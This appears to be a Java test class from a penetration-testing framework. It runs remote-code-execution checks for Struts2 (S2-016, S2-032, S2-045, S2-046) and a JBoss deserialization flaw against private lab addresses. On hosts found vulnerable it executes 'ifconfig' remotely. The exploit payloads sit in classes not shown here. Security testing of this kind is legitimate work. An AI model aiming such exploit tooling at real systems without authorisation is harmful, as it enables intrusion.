package com.orleven.tentacle.test;

import java.io.File;
import java.util.List;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;
import com.orleven.tentacle.config.ConfigDBConfig;
import com.orleven.tentacle.config.DBConfig;
import com.orleven.tentacle.core.IOC;
import com.orleven.tentacle.dao.VulnerDao;
import com.orleven.tentacle.define.Permeate;
import com.orleven.tentacle.entity.Vulner;
import com.orleven.tentacle.permeate.bean.AssetBean;
import com.orleven.tentacle.permeate.bean.AssetInfoBean;
import com.orleven.tentacle.permeate.bean.ServiceBean;
import com.orleven.tentacle.permeate.bean.WebServiceBean;
import com.orleven.tentacle.permeate.script.Struts2RCE045;
import com.orleven.tentacle.permeate.script.base.WebScriptBase;

@Component
@Scope("prototype")
public class Test {
	
	public void test(){
		// 资产测试
//		assetTest();
		
		// 数据库测试
		sqlTest();
	}
	
	/**
	 * 资产测试
	 * @data 2017年3月17日
	 */
	public void assetTest(){
//		struts2045Test();
//		struts2016Test();
//		struts2046Test();
//		struts2032Test();
//		JBossDeserializeRCETest();
	}
	
	/**
	 * 数据库测试
	 * @data 2017年3月21日
	 */
	public void sqlTest(){
		// 目标初始化
		String host = "192.168.111.131";
		String[] ports = {"7001","7002","8080","80"};
		
		AssetInfoBean assetInfoBean = IOC.instance().getClassobj(AssetInfoBean.class);
		assetInfoBean.setHost(host);
		
		AssetBean assetBean = IOC.instance().getClassobj(AssetBean.class);
		assetBean.setAssetInfoBean(assetInfoBean);
		for (String port : ports) {
			ServiceBean serviceBean =new ServiceBean(assetInfoBean,port);
			assetBean.getServiceBeans().add(serviceBean);
		}
		
		// 数据库初始化
		ConfigDBConfig  configDBconfig = IOC.instance().getClassobj(ConfigDBConfig.class);
		configDBconfig.setConfigDataSource(new DBConfig().configDataSource());
		try {
			configDBconfig.connectConfigDB();
		
			VulnerDao vulnerDao = new VulnerDao();
			vulnerDao.setConfigConnection(configDBconfig.getConfigConnection());
			List<Vulner>  vulners  = vulnerDao.getAll();
			for (Vulner vulner:vulners){
			    for (ServiceBean serviceBean : assetBean.getServiceBeans()) {
			    	WebServiceBean webServiceBean = IOC.instance().getClassobj(WebServiceBean.class);
			    	webServiceBean.setValueByServiceBean(serviceBean);
			    	webServiceBean.setProtocolType("http");
			    	
			    	WebScriptBase webScriptBase = null;
			    	webScriptBase = (WebScriptBase) IOC.instance().getClassobj(vulner.getScriptName());

			    	webScriptBase.setWebServiceBean(webServiceBean);
			    	webScriptBase.setAssetInfoBean(assetInfoBean);
			    	webScriptBase.getVulnerBean().setVulner(vulner);
			    	webScriptBase.setUrlPath("/S2-016/default.action");
			    	webScriptBase.setCookies("");
			    	webScriptBase.prove();
			    	if(webScriptBase.getVulnerBean().getIsVulner() == Permeate.isVulner){
			    		System.out.println("********************************");
			    		System.out.println("[+] VulnerName: "+vulner.getVulnerName());
			    		System.out.println("[+] VulnerCVE: "+vulner.getVulnerCVE());
			    		System.out.println("[+] VulnerUrl: "+webScriptBase.getTargetUrl());
			    		
			    		 webScriptBase.execCommand("ifconfig");
				    	 System.out.println(webScriptBase.getVulnerBean().getProveBean().get(1).getReceiveMessage());
//			    	}else if(webScriptBase.getVulnerBean().getIsVulner() == Permeate.isNotVerified){
//			    		System.out.println("********************************");
//			    		System.out.println("[=] VulnerName: "+vulner.getVulnerName());
//			    		System.out.println("[=] VulnerCVE: "+vulner.getVulnerCVE());
//			    		System.out.println("[=] VulnerUrl: "+webScriptBase.getTargetUrl());
//			    		System.out.println("[=] VulnerRec: "+webScriptBase.getVulnerBean().getProveBean().get(0).getReceiveMessage());
			    	}
			    }
				
			}
			
			configDBconfig.closeConfigConnection();
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
	
	public void struts2045Test(){
		String host = "192.168.111.148";
		String[] ports = {"7001","7002"};
		
		AssetInfoBean assetInfoBean = IOC.instance().getClassobj(AssetInfoBean.class);
		assetInfoBean.setHost(host);
		
		AssetBean assetBean = IOC.instance().getClassobj(AssetBean.class);
		assetBean.setAssetInfoBean(assetInfoBean);
		for (String port : ports) {
			ServiceBean serviceBean =new ServiceBean(assetInfoBean,port);
			assetBean.getServiceBeans().add(serviceBean);
		}

		Vulner vulner= new Vulner(0,"Struts2-045","","","", "Remote Code Execute","Hign","struts2RCE045");
	    for (ServiceBean serviceBean : assetBean.getServiceBeans()) {
	    	WebServiceBean webServiceBean = IOC.instance().getClassobj(WebServiceBean.class);
	    	webServiceBean.setValueByServiceBean(serviceBean);
	    	webServiceBean.setProtocolType("http");
	    	
	    	WebScriptBase webScriptBase = null;
	    	webScriptBase = (WebScriptBase) IOC.instance().getClassobj("struts2RCE045");

	    	webScriptBase.setWebServiceBean(webServiceBean);
	    	webScriptBase.setAssetInfoBean(assetInfoBean);
	    	webScriptBase.getVulnerBean().setVulner(vulner);
	    	webScriptBase.setUrlPath("/admin/index.action");
	    	webScriptBase.setCookies("");
	    	webScriptBase.prove();
	    	if(webScriptBase.getVulnerBean().getIsVulner() == Permeate.isVulner){
	    		webScriptBase.execCommand("ifconfig");
		    	System.out.println(webScriptBase.getVulnerBean().getProveBean().get(1).getReceiveMessage());
	    	}
	    }
	    
	}
	
	public void struts2016Test(){
		String host = "192.168.111.131";
		String[] ports = {"7001","8080"};
		
		AssetInfoBean assetInfoBean = IOC.instance().getClassobj(AssetInfoBean.class);
		assetInfoBean.setHost(host);
		
		AssetBean assetBean = IOC.instance().getClassobj(AssetBean.class);
		assetBean.setAssetInfoBean(assetInfoBean);
		for (String port : ports) {
			ServiceBean serviceBean =new ServiceBean(assetInfoBean,port);
			assetBean.getServiceBeans().add(serviceBean);
		}
//		assetBean.setPorts(ports);
		Vulner vulner= new Vulner(0,"Struts2-016","","","", "Remote Code Execute","Hign","struts2RCE016");
	    for (ServiceBean serviceBean : assetBean.getServiceBeans()) {
	    	WebServiceBean webServiceBean = IOC.instance().getClassobj(WebServiceBean.class);
	    	webServiceBean.setValueByServiceBean(serviceBean);
	    	webServiceBean.setProtocolType("http");
	    	
	    	WebScriptBase webScriptBase = null;
	    	webScriptBase = (WebScriptBase) IOC.instance().getClassobj("struts2RCE016");

	    	webScriptBase.setWebServiceBean(webServiceBean);
	    	webScriptBase.setAssetInfoBean(assetInfoBean);
	    	webScriptBase.getVulnerBean().setVulner(vulner);
	    	webScriptBase.setUrlPath("/S2-016/default.action");
	    	webScriptBase.setCookies("");
	    	webScriptBase.prove();

	    	if(webScriptBase.getVulnerBean().getIsVulner() == Permeate.isVulner){
	    		webScriptBase.execCommand("ifconfig");
		    	System.out.println(webScriptBase.getVulnerBean().getProveBean().get(1).getReceiveMessage());
	    	}
	    }
	    
	}
	
	public void struts2032Test(){
		String host = "192.168.111.131";
		String[] ports = {"8080"};
		
		AssetInfoBean assetInfoBean = IOC.instance().getClassobj(AssetInfoBean.class);
		assetInfoBean.setHost(host);
		
		AssetBean assetBean = IOC.instance().getClassobj(AssetBean.class);
		assetBean.setAssetInfoBean(assetInfoBean);
		for (String port : ports) {
			ServiceBean serviceBean =new ServiceBean(assetInfoBean,port);
			assetBean.getServiceBeans().add(serviceBean);
		}
//		assetBean.setPorts(ports);
		Vulner vulner= new Vulner(0,"Struts2-032","","","", "Remote Code Execute","Hign","struts2RCE032");
	    for (ServiceBean serviceBean : assetBean.getServiceBeans()) {
	    	WebServiceBean webServiceBean = IOC.instance().getClassobj(WebServiceBean.class);
	    	webServiceBean.setValueByServiceBean(serviceBean);
	    	webServiceBean.setProtocolType("http");
	    	
	    	WebScriptBase webScriptBase = null;
	    	webScriptBase = (WebScriptBase) IOC.instance().getClassobj("struts2RCE032");

	    	webScriptBase.setWebServiceBean(webServiceBean);
	    	webScriptBase.setAssetInfoBean(assetInfoBean);
	    	webScriptBase.getVulnerBean().setVulner(vulner);
	    	webScriptBase.setUrlPath("/S2-032/index.action");
	    	webScriptBase.setCookies("");
	    	webScriptBase.prove();

	    	if(webScriptBase.getVulnerBean().getIsVulner() == Permeate.isVulner){
	    		webScriptBase.execCommand("ifconfig");
		    	System.out.println(webScriptBase.getVulnerBean().getProveBean().get(1).getReceiveMessage());
	    	}
	    }
	    
	}
	
	public void JBossDeserializeRCETest(){
		String host = "192.168.111.131";
		String[] ports = {"7001","8080"};
		
		AssetInfoBean assetInfoBean = IOC.instance().getClassobj(AssetInfoBean.class);
		assetInfoBean.setHost(host);
		
		AssetBean assetBean = IOC.instance().getClassobj(AssetBean.class);
		assetBean.setAssetInfoBean(assetInfoBean);
		for (String port : ports) {
			ServiceBean serviceBean =new ServiceBean(assetInfoBean,port);
			assetBean.getServiceBeans().add(serviceBean);
		}
//		assetBean.setPorts(ports);
		Vulner vulner= new Vulner(0,"JBossDeserializeRCE","","", "","Remote Code Execute","Hign","jBossDeserializeRCE");
	    for (ServiceBean serviceBean : assetBean.getServiceBeans()) {
	    	WebServiceBean webServiceBean = IOC.instance().getClassobj(WebServiceBean.class);
	    	webServiceBean.setValueByServiceBean(serviceBean);
	    	webServiceBean.setProtocolType("http");
	    	
	    	WebScriptBase webScriptBase = null;
	    	webScriptBase = (WebScriptBase) IOC.instance().getClassobj("jBossDeserializeRCE");

	    	webScriptBase.setWebServiceBean(webServiceBean);
	    	webScriptBase.setAssetInfoBean(assetInfoBean);
	    	webScriptBase.getVulnerBean().setVulner(vulner);
	    	webScriptBase.setCookies("");
	    	webScriptBase.prove();

	    	if(webScriptBase.getVulnerBean().getIsVulner() == Permeate.isVulner){
	    		webScriptBase.execCommand("ifconfig");
		    	System.out.println(webScriptBase.getVulnerBean().getProveBean().get(1).getReceiveMessage());
	    	}
	    }
	    
	}
	
	public void struts2046Test(){
		
		String host = "192.168.111.131";
		String[] ports = {"8080"};
		
		AssetInfoBean assetInfoBean = IOC.instance().getClassobj(AssetInfoBean.class);
		assetInfoBean.setHost(host);
		
		AssetBean assetBean = IOC.instance().getClassobj(AssetBean.class);
		assetBean.setAssetInfoBean(assetInfoBean);
		for (String port : ports) {
			ServiceBean serviceBean =new ServiceBean(assetInfoBean,port);
			assetBean.getServiceBeans().add(serviceBean);
		}
//		assetBean.setPorts(ports);
		Vulner vulner= new Vulner(0,"Struts2-046","","","", "Remote Code Execute","Hign","struts2RCE046");
	    for (ServiceBean serviceBean : assetBean.getServiceBeans()) {
	    	WebServiceBean webServiceBean = IOC.instance().getClassobj(WebServiceBean.class);
	    	webServiceBean.setValueByServiceBean(serviceBean);
	    	webServiceBean.setProtocolType("http");
	    	
	    	WebScriptBase webScriptBase = null;
	    	webScriptBase = (WebScriptBase) IOC.instance().getClassobj("struts2RCE046");

	    	webScriptBase.setWebServiceBean(webServiceBean);
	    	webScriptBase.setAssetInfoBean(assetInfoBean);
	    	webScriptBase.getVulnerBean().setVulner(vulner);
	    	webScriptBase.setUrlPath("/S2-032/index.action");
	    	webScriptBase.setCookies("");
	    	webScriptBase.prove();

	    	if(webScriptBase.getVulnerBean().getIsVulner() == Permeate.isVulner){
	    		webScriptBase.execCommand("ifconfig");
		    	System.out.println(webScriptBase.getVulnerBean().getProveBean().get(1).getReceiveMessage());
	    	}
	    }
		
	}
}
